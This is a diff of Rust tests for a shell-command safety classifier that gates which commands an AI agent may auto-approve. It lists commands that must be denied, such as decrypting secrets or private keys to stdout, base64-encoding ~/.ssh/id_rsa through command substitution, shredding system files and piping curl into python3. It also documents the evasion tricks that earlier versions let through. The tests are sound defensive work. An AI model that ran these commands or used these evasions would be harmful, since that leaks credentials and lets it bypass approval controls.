-        // Every invocation prefix that should classify as decrypt-read: `<cmd> <flag>` (top-level
-        // classifying flag), `<cmd> <sub-path>` (a profiled subcommand), and `<cmd> <sub> <flag>`
-        // (a flag-classified bimodal sub).
-        let mut prefixes = Vec::new();
-        for (name, spec) in TOML_REGISTRY.iter() {
-            for f in &spec.archetype_flags {
-                if f.classifies == "decrypt-read" {
-                    prefixes.push(format!("{name} {}", f.name));
-                }
-            }
-            collect_decrypt_sub_paths(name, &spec.kind, &mut prefixes);
-        }
-
-        assert!(
-            prefixes.len() >= 5,
-            "expected the known decrypt-read set (sops -d/--decrypt/decrypt, age -d/--decrypt, \
-             ansible-vault view), got {}: {prefixes:?}",
-            prefixes.len(),
-        );
-
-        for prefix in &prefixes {
-            let inv = format!("{prefix} ./secrets.file");
-            // (1) Denied at the auto-approve band — the safety property.
-            assert_eq!(
-                crate::command_verdict(&inv), Verdict::Denied,
-                "decrypt-read must deny at the default band: {inv}",
-            );
-            // (2) Resolves to a secret=reads capability — proves it is CLASSIFIED as decrypt-read
-            // (yolo-reachable), not merely denied by some unrelated flag rejection.
-            let mut parts: Vec<&str> = prefix.split(' ').collect();
-            parts.push("./secrets.file");
-            let profile = crate::engine::resolve::resolve(&toks(&parts))
-                .unwrap_or_else(|| panic!("decrypt-read invocation must resolve via the engine: {inv}"));
-            assert!(
-                profile.capabilities.iter().any(|c| c.secret.level == SecretLevel::Reads),
-                "decrypt-read invocation must carry a secret=reads capability: {inv}",
-            );
-        }
-    }
-
-    /// Corpus ratchet — known decrypt-to-screen invocations that MUST deny at the auto-approve band.
-    /// The registry-walking guard above proves DECLARED decrypt-read classifications work; this catches
-    /// an UNCLASSIFIED sibling shipping open, which is exactly how `ansible-vault decrypt` slipped
-    /// (gated `view` but not `decrypt`). Hand-curated on purpose — a real disclosure form per tool, so a
-    /// regression on any specific spelling trips even though the registry walk can't see an unclassified
-    /// sub. Add a line here whenever a new decrypt surface is researched.
-    #[test]
-    fn decrypt_to_screen_corpus_denies() {
-        for c in [
-            "sops -d secrets.yaml",
-            "sops --decrypt secrets.yaml",
-            "sops decrypt secrets.yaml",
-            "age -d secrets.age",
-            "age --decrypt -i k secrets.age",
-            "gpg -d secret.gpg",
-            "gpg --decrypt secret.gpg",
-            "ansible-vault view vault.yml",
-            "ansible-vault decrypt vault.yml",
-            "ansible-vault decrypt --output - vault.yml",
-            "openssl enc -d -in x.enc -k p",
-            "openssl smime -decrypt -in m.p7 -inkey k.pem",
-            "openssl cms -decrypt -in m -inkey k",
-            "openssl cms -EncryptedData_decrypt -in m -secretkey ABCD", // sibling decrypt spelling
-            // private-key-to-stdout — decrypt-read unless switched to PUBLIC mode (-pubout/-pubin).
-            // -out/-noout are NOT neutralizers: -out's value can be stdout, and -text dumps the private
-            // components regardless — so these disclosure/extraction forms all deny (review findings 1+2).
-            "openssl rsa -in enc.pem -passin pass:x",
-            "openssl rsa -in priv.pem -out /dev/stdout", // -out value is stdout → still a disclosure
-            "openssl rsa -in priv.pem -out -",           // "-" is stdout on modern openssl
-            "openssl rsa -in priv.pem -out //dev/stdout", // path-normalization evasion (fail-closed)
-            "openssl rsa -in priv.pem -out /dev/stderr",  // stderr reaches the model in merged-output harnesses
-            "openssl rsa -in priv.pem -out safe.pem -out /dev/stdout", // duplicate -out (openssl: last-wins)
-            "openssl rsa -in k.pem -provider-path -out -provider-path safe.pem", // valued flag swallows -out
-            "openssl rsa -in priv.pem -noout -text",     // -text dumps private components past -noout
-            "openssl rsa -in priv.pem -pubout -text",    // -text dumps private components past -pubout too
-            "openssl pkey -in priv.pem -pubout -text",
-            "openssl enc --d -aes-128-cbc -k p -in ct.enc", // openssl --opt alias for -opt
-            "openssl cms --decrypt -in m -inkey k",
-            "openssl pkcs12 -in f.p12 --noenc",
-            "openssl pkey -in priv.pem",
-            "openssl ec -in priv.pem",
-            "openssl pkcs8 -in priv.pem",
-            "openssl pkcs12 -in file.p12 -noenc",
-            "openssl pkcs12 -in file.p12 -nodes",
-            "openssl pkcs12 -in file.p12 -nodes -out /dev/stdout",
-            // gpg implicit decrypt (bare positional, no inspection command)
-            "gpg secret.gpg",
-            "gpg --verbose secret.gpg",
-        ] {
-            assert!(!crate::is_safe_command(c), "decrypt-to-screen must deny at the band: {c}");
-        }
-        // The COMPLEMENT — forms `resolve_openssl` recognizes as NOT a model disclosure must stay
-        // allowed: public-key mode (-pubout/-pubin, even with -text: -pubin makes -text public),
-        // to-FILE extraction (-out FILE diverts off stdout), -noout validation, the re-encrypted pkcs12
-        // default, encrypt/sign, and gpg inspection commands. Guards the resolver against over-denying.
-        for c in [
-            "openssl rsa -in priv.pem -pubout",
-            "openssl pkey -in pub.pem -pubin -text",       // public input → -text is public, safe
-            "openssl rsa -in enc.pem -out clean.pem",      // private key to a FILE (off the model)
-            "openssl rsa -in priv.pem -noout",             // validate, no output
-            "openssl pkcs12 -in file.p12 -nodes -out key.pem", // unencrypted key to a FILE
-            "openssl pkcs12 -in file.p12",                 // default re-encrypts the key
-            "openssl enc -d -out plain.txt -k p -in ct.enc",   // decrypt to a FILE
-            "openssl enc -e -in x -out x.enc -k p",
-            "openssl cms -sign -in m -signer c",
-            "gpg --list-keys",
-            "gpg --version",
-        ] {
-            assert!(crate::is_safe_command(c), "a public/to-file/read form must stay allowed: {c}");
-        }
-    }
-
-    /// A command-substitution operand (`$(…)` / backtick) evaluates to the CST placeholder
-    /// `__SAFE_CHAINS_CMDSUB__` — an UNPINNABLE value the static classifier cannot resolve. The
-    /// verdict layer already worst-cases it (`is_unpinnable` → Machine → Denied), but the simple
-    /// path gate's `looks_like_path` pre-filter used to reject it (no `/` or `.`) and short-circuit
-    /// BEFORE the verdict ran, so `shred $(…)`, `base64 $(…)`, `od $(…)`, `tee $(…)` auto-approved
-    /// with a substituted target the caller controls. The engine-resolved readers (`cat`, `head`)
-    /// already denied it — this closes the same hole in the legacy pathgate. The invariant: an
-    /// unpinnable operand is gated identically whether it is a bare positional or glued to a path
-    /// flag, across every simple-gate reader/writer/destroyer/exec role.
-    #[test]
-    fn command_substitution_operand_is_gated_across_simple_gates() {
-        for c in [
-            "od $(echo /etc/shadow)",              // reader
-            "base64 $(echo ~/.ssh/id_rsa)",        // reader (exfil surface)
-            "base64 `echo ~/.ssh/id_rsa`",         // backtick spelling of the same
-            "shred $(echo /etc/hosts)",            // destroyer
-            "tee $(echo /etc/hosts)",              // writer
-            "cpio -O$(echo /etc/cron.d/x)",        // glued write flag
-            "cpio -O $(echo /etc/cron.d/x)",       // separate write flag
-        ] {
-            assert!(!crate::is_safe_command(c), "unpinnable cmdsub operand must be gated: {c}");
-        }
-        // Non-vacuity floor: the SAME commands on a plain worktree path stay allowed, so the guard
-        // asserts the cmdsub gate, not a blanket deny of these tools.
-        for c in ["od ./notes.txt", "base64 ./data.bin", "tee ./out.log"] {
-            assert!(crate::is_safe_command(c), "plain worktree operand must stay allowed: {c}");
-        }
-    }
-
-    /// openssl accepts `--opt` as an alias for `-opt` on every subcommand, so every decrypt trigger
-    /// `resolve_openssl` recognizes must deny in BOTH the single-dash and double-dash spelling
-    /// (adversarial-review finding — `openssl enc --d` decrypted past the exact-match classifier;
-    /// `resolve_openssl` normalizes the `--` twin). A new decrypt trigger added to the resolver should
-    /// gain a row here.
-    #[test]
-    fn openssl_decrypt_triggers_gate_both_dash_spellings() {
-        for (sub, flag) in [
-            ("enc", "-d"),
-            ("smime", "-decrypt"),
-            ("cms", "-decrypt"),
-            ("cms", "-EncryptedData_decrypt"),
-            ("pkcs12", "-noenc"),
-            ("pkcs12", "-nodes"),
-        ] {
-            let single = format!("openssl {sub} {flag} -in x -k p");
-            let double = format!("openssl {sub} -{flag} -in x -k p"); // -flag → --flag
-            assert!(!crate::is_safe_command(&single), "single-dash must deny: {single}");
-            assert!(!crate::is_safe_command(&double), "double-dash twin must deny: {double}");
-        }
-    }
-
-    /// A `File` executor that also caps its positionals must carry a `path_gate`.
-    ///
-    /// `dispatch_executor` returns the executor's LOCUS verdict instead of running the flag policy
-    /// (it has to — for an interpreter the tokens after the script are the script's argv, which the
-    /// command's grammar cannot describe). The side effect is that `max_positional` goes unenforced
-    /// on that path and any positional past the first is neither counted nor locus-gated. A command
-    /// that bothered to declare a cap means it, so it needs the gate that composes with the grammar
-    /// rather than replacing it.
-    ///
-    /// This is the structural half of the TODO.md entry on that dispatch gap: it cannot fix the
-    /// dispatch, but it stops the next `executor = "file"` command from inheriting the hole
-    /// silently. `tilt` and `karma` both shipped it — `tilt ./ok.erb /etc/evil.erb` and
-    /// `karma start ./ok.conf.js /etc/evil.conf.js` were admitted.
-    #[test]
-    fn capped_file_executors_declare_a_path_gate() {
-        use crate::registry::types::{ExecutorKind, SubSpec};
-        let mut failures = Vec::new();
-        let mut checked = 0usize;
-        for (name, spec) in TOML_REGISTRY.iter() {
-            if name != &spec.name {
-                continue; // alias entries share the canonical spec
-            }
-            // A capped File executor can sit on the command itself, on a `[[command.sub]]` (karma's
-            // `start`, reached through `Branching`), or on a handler's fallback (an interpreter).
-            let sub_is_capped = |s: &SubSpec| {
-                matches!(
-                    &s.kind,
-                    DispatchKind::Executor { policy, kind: ExecutorKind::File, .. }
-                        if policy.max_positional.is_some()
-                )
-            };
-            let capped_file_executor = match &spec.kind {
-                DispatchKind::Executor { policy, kind: ExecutorKind::File, .. } => {
-                    policy.max_positional.is_some()
-                }
-                DispatchKind::Branching { subs, .. } => subs.iter().any(sub_is_capped),
-                DispatchKind::Custom { fallback, subs, .. } => {
-                    fallback.as_ref().is_some_and(|f| {
-                        f.executor == Some(ExecutorKind::File) && f.policy.max_positional.is_some()
-                    }) || subs.iter().any(sub_is_capped)
-                }
-                _ => false,
-            };
-            if !capped_file_executor {
-                continue;
-            }
-            checked += 1;
-            if spec.path_gate.is_none() && !crate::pathgate::central_role_exists(name) {
-                failures.push(format!(
-                    "{name}: declares a File executor with max_positional but no path_gate, so its \
-                     cap is dropped on the executor path and extra positionals ship ungated"
-                ));
-            }
-        }
-        assert!(checked > 0, "no capped File executor found — the guard is vacuous");
-        assert!(failures.is_empty(), "{}", failures.join("\n"));
-    }
-
-    /// `--help` on a write command prints usage and exits. It is not a write with a hidden target.
-    ///
-    /// The engine worst-cases a write-role behavior with no operand, which is the right default for
-    /// `rm -f` (where an operand may have been consumed by a flag) but denied every informational
-    /// invocation of every write command: `rm --help`, `mkdir --help`, `rmdir --version`. Enumerated
-    /// over the registry so a command that declares write behavior later inherits the fix and the
-    /// three properties that bound it.
-    #[test]
-    fn an_informational_flag_is_not_a_write_but_never_launders_an_operand() {
-        use crate::registry::types::PositionalRole;
-        let mut checked = 0usize;
-        let mut failures = Vec::new();
-        for (name, spec) in TOML_REGISTRY.iter() {
-            if name != &spec.name {
-                continue; // alias entries share the canonical spec
-            }
-            let Some(behavior) = spec.behavior.as_ref() else { continue };
-            if behavior.positionals != PositionalRole::Write {
-                continue;
-            }
-            checked += 1;
-            // Informational and operand-free: allowed.
-            for flag in ["--help", "--version"] {
-                let line = format!("{name} {flag}");
-                if !crate::is_safe_command(&line) {
-                    failures.push(format!("{line}: informational invocation denied"));
-                }
-            }
-            // Still a write with no operand: worst-cased, as before.
-            if crate::is_safe_command(name) {
-                failures.push(format!("{name}: bare write invocation must not auto-approve"));
-            }
-            // And the flag must not LAUNDER a real operand — the whole risk of the exemption.
-            let laundered = format!("{name} --help /etc/safe-chains-probe");
-            if crate::is_safe_command(&laundered) {
-                failures.push(format!("{laundered}: --help laundered an out-of-workspace operand"));
-            }
-        }
-        assert!(checked >= 3, "only {checked} write-behavior commands probed — the walk is wrong");
-        assert!(failures.is_empty(), "{}", failures.join("\n"));
-    }
-
-    /// STDIN is not a workspace file, for any executor.
-    ///
-    /// `python3 -`, `node -` and `ruby -` each read their PROGRAM from stdin, so the code being run
-    /// is neither in the worktree nor anywhere in the command string. The bare `-` was resolving as
-    /// an ordinary relative path, which classifies worktree-local, so `curl … | python3 -` was
-    /// auto-approved: remote code execution through the allowlist. `/dev/stdin` and `/dev/fd/0`
-    /// already denied as absolute foreign paths; only the short spelling slipped.
-    ///
-    /// Enumerated over the registry rather than over the three interpreters that happen to have it
-    /// today, so the next `executor = "file"` command cannot inherit the same hole.
-    #[test]
-    fn no_file_executor_accepts_stdin_as_its_program() {
-        use crate::registry::types::{ExecutorKind, SubSpec};
-        let is_file_exec =
-            |k: &DispatchKind| matches!(k, DispatchKind::Executor { kind: ExecutorKind::File, .. });
-        let sub_invocations = |name: &str, subs: &[SubSpec]| -> Vec<String> {
-            subs.iter()
-                .filter(|s| is_file_exec(&s.kind))
-                .map(|s| format!("{name} {} -", s.name))
-                .collect()
+    fn collect_decrypt_sub_paths(prefix: &str, kind: &DispatchKind, out: &mut Vec<String>) {
+        let subs = match kind {
+            DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
+            _ => return,
         };
-
-        let mut failures = Vec::new();
-        let mut checked = 0usize;
-        for (name, spec) in TOML_REGISTRY.iter() {
-            if name != &spec.name {
-                continue; // alias entries share the canonical spec
+        for s in subs {
+            let path = format!("{prefix} {}", s.name);
+            // A sub classified as decrypt-read by its base `profile` (`sops decrypt`)...
+            if s.profile.as_deref() == Some("decrypt-read") {
+                out.push(path.clone());
             }
-            let mut invocations = Vec::new();
-            if is_file_exec(&spec.kind) {
-                invocations.push(format!("{name} -"));
-            }
-            match &spec.kind {
-                DispatchKind::Branching { subs, .. } => {
-                    invocations.extend(sub_invocations(name, subs));
-                }
-                DispatchKind::Custom { fallback, subs, .. } => {
-                    if fallback.as_ref().is_some_and(|f| f.executor == Some(ExecutorKind::File)) {
-                        invocations.push(format!("{name} -"));
-                    }
-                    invocations.extend(sub_invocations(name, subs));
-                }
-                _ => {}
-            }
-            for inv in invocations {
-                checked += 1;
-                if crate::is_safe_command(&inv) {
-                    failures.push(format!("{inv}: stdin accepted as the program to run"));
+            // ...or by an escalating flag on a bimodal sub (`openssl enc -d`).
+            for f in &s.flags {
+                if f.classifies == "decrypt-read" {
+                    out.push(format!("{path} {}", f.name));
                 }
             }
+            collect_decrypt_sub_paths(&path, &s.kind, out);
         }
-        assert!(checked >= 3, "only {checked} file-executor invocations probed — the walk is wrong");
-        assert!(failures.is_empty(), "{}", failures.join("\n"));
     }
 
-    #[test]
-    fn toml_registry_rejects_unknown_flags() {
-        let mut failures = Vec::new();
-        for (name, spec) in TOML_REGISTRY.iter() {
-            // grep owns its flag semantics (an unrecognized `--token` is a search PATTERN, not a
-            // flag — read-only, so it can't unlock danger); that leniency is covered by the grep_*
-            // resolver tests, not this generic deny-unknown sweep. Hookless behavior commands
-            // (cat/rm/…) are never skipped; the engine rejects their unknown flags.
-            if is_grep_hook(spec) {
-                continue;
+    // Every invocation prefix that should classify as decrypt-read: `<cmd> <flag>` (top-level
+    // classifying flag), `<cmd> <sub-path>` (a profiled subcommand), and `<cmd> <sub> <flag>`
+    // (a flag-classified bimodal sub).
+    let mut prefixes = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        for f in &spec.archetype_flags {
+            if f.classifies == "decrypt-read" {
+                prefixes.push(format!("{name} {}", f.name));
             }
-            match &spec.kind {
+        }
+        collect_decrypt_sub_paths(name, &spec.kind, &mut prefixes);
+    }
+
+    assert!(
+        prefixes.len() >= 5,
+        "expected the known decrypt-read set (sops -d/--decrypt/decrypt, age -d/--decrypt, \
+             ansible-vault view), got {}: {prefixes:?}",
+        prefixes.len(),
+    );
+
+    for prefix in &prefixes {
+        let inv = format!("{prefix} ./secrets.file");
+        // (1) Denied at the auto-approve band — the safety property.
+        assert_eq!(crate::command_verdict(&inv), Verdict::Denied, "decrypt-read must deny at the default band: {inv}",);
+        // (2) Resolves to a secret=reads capability — proves it is CLASSIFIED as decrypt-read
+        // (yolo-reachable), not merely denied by some unrelated flag rejection.
+        let mut parts: Vec<&str> = prefix.split(' ').collect();
+        parts.push("./secrets.file");
+        let profile = crate::engine::resolve::resolve(&toks(&parts))
+            .unwrap_or_else(|| panic!("decrypt-read invocation must resolve via the engine: {inv}"));
+        assert!(
+            profile.capabilities.iter().any(|c| c.secret.level == SecretLevel::Reads),
+            "decrypt-read invocation must carry a secret=reads capability: {inv}",
+        );
+    }
+}
+
+/// Corpus ratchet — known decrypt-to-screen invocations that MUST deny at the auto-approve band.
+/// The registry-walking guard above proves DECLARED decrypt-read classifications work; this catches
+/// an UNCLASSIFIED sibling shipping open, which is exactly how `ansible-vault decrypt` slipped
+/// (gated `view` but not `decrypt`). Hand-curated on purpose — a real disclosure form per tool, so a
+/// regression on any specific spelling trips even though the registry walk can't see an unclassified
+/// sub. Add a line here whenever a new decrypt surface is researched.
+#[test]
+fn decrypt_to_screen_corpus_denies() {
+    for c in [
+        "sops -d secrets.yaml",
+        "sops --decrypt secrets.yaml",
+        "sops decrypt secrets.yaml",
+        "age -d secrets.age",
+        "age --decrypt -i k secrets.age",
+        "gpg -d secret.gpg",
+        "gpg --decrypt secret.gpg",
+        "ansible-vault view vault.yml",
+        "ansible-vault decrypt vault.yml",
+        "ansible-vault decrypt --output - vault.yml",
+        "openssl enc -d -in x.enc -k p",
+        "openssl smime -decrypt -in m.p7 -inkey k.pem",
+        "openssl cms -decrypt -in m -inkey k",
+        "openssl cms -EncryptedData_decrypt -in m -secretkey ABCD", // sibling decrypt spelling
+        // private-key-to-stdout — decrypt-read unless switched to PUBLIC mode (-pubout/-pubin).
+        // -out/-noout are NOT neutralizers: -out's value can be stdout, and -text dumps the private
+        // components regardless — so these disclosure/extraction forms all deny (review findings 1+2).
+        "openssl rsa -in enc.pem -passin pass:x",
+        "openssl rsa -in priv.pem -out /dev/stdout",  // -out value is stdout → still a disclosure
+        "openssl rsa -in priv.pem -out -",            // "-" is stdout on modern openssl
+        "openssl rsa -in priv.pem -out //dev/stdout", // path-normalization evasion (fail-closed)
+        "openssl rsa -in priv.pem -out /dev/stderr",  // stderr reaches the model in merged-output harnesses
+        "openssl rsa -in priv.pem -out safe.pem -out /dev/stdout", // duplicate -out (openssl: last-wins)
+        "openssl rsa -in k.pem -provider-path -out -provider-path safe.pem", // valued flag swallows -out
+        "openssl rsa -in priv.pem -noout -text",      // -text dumps private components past -noout
+        "openssl rsa -in priv.pem -pubout -text",     // -text dumps private components past -pubout too
+        "openssl pkey -in priv.pem -pubout -text",
+        "openssl enc --d -aes-128-cbc -k p -in ct.enc", // openssl --opt alias for -opt
+        "openssl cms --decrypt -in m -inkey k",
+        "openssl pkcs12 -in f.p12 --noenc",
+        "openssl pkey -in priv.pem",
+        "openssl ec -in priv.pem",
+        "openssl pkcs8 -in priv.pem",
+        "openssl pkcs12 -in file.p12 -noenc",
+        "openssl pkcs12 -in file.p12 -nodes",
+        "openssl pkcs12 -in file.p12 -nodes -out /dev/stdout",
+        // gpg implicit decrypt (bare positional, no inspection command)
+        "gpg secret.gpg",
+        "gpg --verbose secret.gpg",
+    ] {
+        assert!(!crate::is_safe_command(c), "decrypt-to-screen must deny at the band: {c}");
+    }
+    // The COMPLEMENT — forms `resolve_openssl` recognizes as NOT a model disclosure must stay
+    // allowed: public-key mode (-pubout/-pubin, even with -text: -pubin makes -text public),
+    // to-FILE extraction (-out FILE diverts off stdout), -noout validation, the re-encrypted pkcs12
+    // default, encrypt/sign, and gpg inspection commands. Guards the resolver against over-denying.
+    for c in [
+        "openssl rsa -in priv.pem -pubout",
+        "openssl pkey -in pub.pem -pubin -text",           // public input → -text is public, safe
+        "openssl rsa -in enc.pem -out clean.pem",          // private key to a FILE (off the model)
+        "openssl rsa -in priv.pem -noout",                 // validate, no output
+        "openssl pkcs12 -in file.p12 -nodes -out key.pem", // unencrypted key to a FILE
+        "openssl pkcs12 -in file.p12",                     // default re-encrypts the key
+        "openssl enc -d -out plain.txt -k p -in ct.enc",   // decrypt to a FILE
+        "openssl enc -e -in x -out x.enc -k p",
+        "openssl cms -sign -in m -signer c",
+        "gpg --list-keys",
+        "gpg --version",
+    ] {
+        assert!(crate::is_safe_command(c), "a public/to-file/read form must stay allowed: {c}");
+    }
+}
+
+/// A command-substitution operand (`$(…)` / backtick) evaluates to the CST placeholder
+/// `__SAFE_CHAINS_CMDSUB__` — an UNPINNABLE value the static classifier cannot resolve. The
+/// verdict layer already worst-cases it (`is_unpinnable` → Machine → Denied), but the simple
+/// path gate's `looks_like_path` pre-filter used to reject it (no `/` or `.`) and short-circuit
+/// BEFORE the verdict ran, so `shred $(…)`, `base64 $(…)`, `od $(…)`, `tee $(…)` auto-approved
+/// with a substituted target the caller controls. The engine-resolved readers (`cat`, `head`)
+/// already denied it — this closes the same hole in the legacy pathgate. The invariant: an
+/// unpinnable operand is gated identically whether it is a bare positional or glued to a path
+/// flag, across every simple-gate reader/writer/destroyer/exec role.
+#[test]
+fn command_substitution_operand_is_gated_across_simple_gates() {
+    for c in [
+        "od $(echo /etc/shadow)",        // reader
+        "base64 $(echo ~/.ssh/id_rsa)",  // reader (exfil surface)
+        "base64 `echo ~/.ssh/id_rsa`",   // backtick spelling of the same
+        "shred $(echo /etc/hosts)",      // destroyer
+        "tee $(echo /etc/hosts)",        // writer
+        "cpio -O$(echo /etc/cron.d/x)",  // glued write flag
+        "cpio -O $(echo /etc/cron.d/x)", // separate write flag
+    ] {
+        assert!(!crate::is_safe_command(c), "unpinnable cmdsub operand must be gated: {c}");
+    }
+    // Non-vacuity floor: the SAME commands on a plain worktree path stay allowed, so the guard
+    // asserts the cmdsub gate, not a blanket deny of these tools.
+    for c in ["od ./notes.txt", "base64 ./data.bin", "tee ./out.log"] {
+        assert!(crate::is_safe_command(c), "plain worktree operand must stay allowed: {c}");
+    }
+}
+
+/// openssl accepts `--opt` as an alias for `-opt` on every subcommand, so every decrypt trigger
+/// `resolve_openssl` recognizes must deny in BOTH the single-dash and double-dash spelling
+/// (adversarial-review finding — `openssl enc --d` decrypted past the exact-match classifier;
+/// `resolve_openssl` normalizes the `--` twin). A new decrypt trigger added to the resolver should
+/// gain a row here.
+#[test]
+fn openssl_decrypt_triggers_gate_both_dash_spellings() {
+    for (sub, flag) in [
+        ("enc", "-d"),
+        ("smime", "-decrypt"),
+        ("cms", "-decrypt"),
+        ("cms", "-EncryptedData_decrypt"),
+        ("pkcs12", "-noenc"),
+        ("pkcs12", "-nodes"),
+    ] {
+        let single = format!("openssl {sub} {flag} -in x -k p");
+        let double = format!("openssl {sub} -{flag} -in x -k p"); // -flag → --flag
+        assert!(!crate::is_safe_command(&single), "single-dash must deny: {single}");
+        assert!(!crate::is_safe_command(&double), "double-dash twin must deny: {double}");
+    }
+}
+
+/// A `File` executor that also caps its positionals must carry a `path_gate`.
+///
+/// `dispatch_executor` returns the executor's LOCUS verdict instead of running the flag policy
+/// (it has to — for an interpreter the tokens after the script are the script's argv, which the
+/// command's grammar cannot describe). The side effect is that `max_positional` goes unenforced
+/// on that path and any positional past the first is neither counted nor locus-gated. A command
+/// that bothered to declare a cap means it, so it needs the gate that composes with the grammar
+/// rather than replacing it.
+///
+/// This is the structural half of the TODO.md entry on that dispatch gap: it cannot fix the
+/// dispatch, but it stops the next `executor = "file"` command from inheriting the hole
+/// silently. `tilt` and `karma` both shipped it — `tilt ./ok.erb /etc/evil.erb` and
+/// `karma start ./ok.conf.js /etc/evil.conf.js` were admitted.
+#[test]
+fn capped_file_executors_declare_a_path_gate() {
+    use crate::registry::types::{ExecutorKind, SubSpec};
+    let mut failures = Vec::new();
+    let mut checked = 0usize;
+    for (name, spec) in TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue; // alias entries share the canonical spec
+        }
+        // A capped File executor can sit on the command itself, on a `[[command.sub]]` (karma's
+        // `start`, reached through `Branching`), or on a handler's fallback (an interpreter).
+        let sub_is_capped = |s: &SubSpec| {
+            matches!(
+                &s.kind,
+                DispatchKind::Executor { policy, kind: ExecutorKind::File, .. }
+                    if policy.max_positional.is_some()
+            )
+        };
+        let capped_file_executor = match &spec.kind {
+            DispatchKind::Executor { policy, kind: ExecutorKind::File, .. } => policy.max_positional.is_some(),
+            DispatchKind::Branching { subs, .. } => subs.iter().any(sub_is_capped),
+            DispatchKind::Custom { fallback, subs, .. } => {
+                fallback
+                    .as_ref()
+                    .is_some_and(|f| f.executor == Some(ExecutorKind::File) && f.policy.max_positional.is_some())
+                    || subs.iter().any(sub_is_capped)
+            }
+            _ => false,
+        };
+        if !capped_file_executor {
+            continue;
+        }
+        checked += 1;
+        if spec.path_gate.is_none() && !crate::pathgate::central_role_exists(name) {
+            failures.push(format!(
+                "{name}: declares a File executor with max_positional but no path_gate, so its \
+                     cap is dropped on the executor path and extra positionals ship ungated"
+            ));
+        }
+    }
+    assert!(checked > 0, "no capped File executor found — the guard is vacuous");
+    assert!(failures.is_empty(), "{}", failures.join("\n"));
+}
+
+/// `--help` on a write command prints usage and exits. It is not a write with a hidden target.
+///
+/// The engine worst-cases a write-role behavior with no operand, which is the right default for
+/// `rm -f` (where an operand may have been consumed by a flag) but denied every informational
+/// invocation of every write command: `rm --help`, `mkdir --help`, `rmdir --version`. Enumerated
+/// over the registry so a command that declares write behavior later inherits the fix and the
+/// three properties that bound it.
+#[test]
+fn an_informational_flag_is_not_a_write_but_never_launders_an_operand() {
+    use crate::registry::types::PositionalRole;
+    let mut checked = 0usize;
+    let mut failures = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue; // alias entries share the canonical spec
+        }
+        let Some(behavior) = spec.behavior.as_ref() else { continue };
+        if behavior.positionals != PositionalRole::Write {
+            continue;
+        }
+        checked += 1;
+        // Informational and operand-free: allowed.
+        for flag in ["--help", "--version"] {
+            let line = format!("{name} {flag}");
+            if !crate::is_safe_command(&line) {
+                failures.push(format!("{line}: informational invocation denied"));
+            }
+        }
+        // Still a write with no operand: worst-cased, as before.
+        if crate::is_safe_command(name) {
+            failures.push(format!("{name}: bare write invocation must not auto-approve"));
+        }
+        // And the flag must not LAUNDER a real operand — the whole risk of the exemption.
+        let laundered = format!("{name} --help /etc/safe-chains-probe");
+        if crate::is_safe_command(&laundered) {
+            failures.push(format!("{laundered}: --help laundered an out-of-workspace operand"));
+        }
+    }
+    assert!(checked >= 3, "only {checked} write-behavior commands probed — the walk is wrong");
+    assert!(failures.is_empty(), "{}", failures.join("\n"));
+}
+
+/// STDIN is not a workspace file, for any executor.
+///
+/// `python3 -`, `node -` and `ruby -` each read their PROGRAM from stdin, so the code being run
+/// is neither in the worktree nor anywhere in the command string. The bare `-` was resolving as
+/// an ordinary relative path, which classifies worktree-local, so `curl … | python3 -` was
+/// auto-approved: remote code execution through the allowlist. `/dev/stdin` and `/dev/fd/0`
+/// already denied as absolute foreign paths; only the short spelling slipped.
+///
+/// Enumerated over the registry rather than over the three interpreters that happen to have it
+/// today, so the next `executor = "file"` command cannot inherit the same hole.
+#[test]
+fn no_file_executor_accepts_stdin_as_its_program() {
+    use crate::registry::types::{ExecutorKind, SubSpec};
+    let is_file_exec = |k: &DispatchKind| matches!(k, DispatchKind::Executor { kind: ExecutorKind::File, .. });
+    let sub_invocations = |name: &str, subs: &[SubSpec]| -> Vec<String> {
+        subs.iter().filter(|s| is_file_exec(&s.kind)).map(|s| format!("{name} {} -", s.name)).collect()
+    };
+
+    let mut failures = Vec::new();
+    let mut checked = 0usize;
+    for (name, spec) in TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue; // alias entries share the canonical spec
+        }
+        let mut invocations = Vec::new();
+        if is_file_exec(&spec.kind) {
+            invocations.push(format!("{name} -"));
+        }
+        match &spec.kind {
+            DispatchKind::Branching { subs, .. } => {
+                invocations.extend(sub_invocations(name, subs));
+            }
+            DispatchKind::Custom { fallback, subs, .. } => {
+                if fallback.as_ref().is_some_and(|f| f.executor == Some(ExecutorKind::File)) {
+                    invocations.push(format!("{name} -"));
+                }
+                invocations.extend(sub_invocations(name, subs));
+            }
+            _ => {}
+        }
+        for inv in invocations {
+            checked += 1;
+            if crate::is_safe_command(&inv) {
+                failures.push(format!("{inv}: stdin accepted as the program to run"));
+            }
+        }
+    }
+    assert!(checked >= 3, "only {checked} file-executor invocations probed — the walk is wrong");
+    assert!(failures.is_empty(), "{}", failures.join("\n"));
+}
+
+#[test]
+fn toml_registry_rejects_unknown_flags() {
+    let mut failures = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        // grep owns its flag semantics (an unrecognized `--token` is a search PATTERN, not a
+        // flag — read-only, so it can't unlock danger); that leniency is covered by the grep_*
+        // resolver tests, not this generic deny-unknown sweep. Hookless behavior commands
+        // (cat/rm/…) are never skipped; the engine rejects their unknown flags.
+        if is_grep_hook(spec) {
+            continue;
+        }
+        match &spec.kind {
                 DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                     // Skip only commands that explicitly accept double-dash
                     // unknowns (the dangerous tolerance). Commands using just
@@ -2715,1818 +2478,1690 @@ use super::*;
                 DispatchKind::Custom { .. } => continue,
                 _ => {}
             }
-            let test = format!("{name} --xyzzy-unknown-42");
-            if crate::is_safe_command(&test) {
-                failures.push(format!("{name}: accepted unknown flag"));
-            }
+        let test = format!("{name} --xyzzy-unknown-42");
+        if crate::is_safe_command(&test) {
+            failures.push(format!("{name}: accepted unknown flag"));
         }
-        assert!(failures.is_empty(), "TOML commands accepted unknown flags:\n{}", failures.join("\n"));
     }
+    assert!(failures.is_empty(), "TOML commands accepted unknown flags:\n{}", failures.join("\n"));
+}
 
-    /// Data-defined spec: every TOML can declare `examples_safe` and
-    /// `examples_denied` strings that exercise canonical and alias
-    /// invocations. This test runs each through `is_safe_command` and
-    /// flags any drift between the TOML and the runtime dispatcher.
-    /// Use to lock in alias correctness, security boundaries, and
-    /// representative agent invocations.
